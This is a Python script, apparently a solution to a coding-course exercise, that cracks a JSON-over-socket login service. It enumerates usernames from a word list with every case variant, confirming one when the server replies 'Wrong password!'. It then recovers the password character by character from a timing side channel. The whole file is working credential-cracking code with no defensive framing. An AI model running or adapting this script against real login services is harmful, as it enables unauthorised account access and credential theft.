import time
import json
import socket
import string
import sys
from pathlib import Path
import itertools


def get_logins():
    path = Path() / "logins.txt"
    with path.open() as f:
        for line in f:
            yield line.strip()


def get_passwords():
    path = Path() / "passwords.txt"
    with path.open() as f:
        for line in f:
            yield line.strip()


def get_case_variants(word):
    for variant in itertools.product(*zip(word.upper(), word.lower())):
        yield "".join(variant)


def main():
    host, port = sys.argv[1:]

    with socket.socket() as client:
        client.connect((host, int(port)))

        found_login = ""
        found_password = ""

        for needle in get_logins():
            for login in get_case_variants(needle):
                message = {"login": login, "password": ""}
                client.send(json.dumps(message).encode())
                response = client.recv(1024)
                json_response = json.loads(response.decode())
                result = json_response.get("result", "")
                if result == "Wrong password!":
                    found_login = login
                    break
            if found_login:
                break

        letters = string.ascii_letters + string.digits
        searching_password = True
        while searching_password:
            for letter in letters:
                message = {"login": found_login, "password": found_password + letter}
                client.send(json.dumps(message).encode())
                start = time.time()
                response = client.recv(1024)
                end = time.time()
                json_response = json.loads(response.decode())
                result = json_response.get("result", "")
                if end - start > 0.1:
                    found_password += letter
                    break
                elif result == "Connection success!":
                    found_password += letter
                    searching_password = False
                    break

        result = json.dumps({"login": found_login, "password": found_password})
        print(result)


if __name__ == "__main__":
    main()
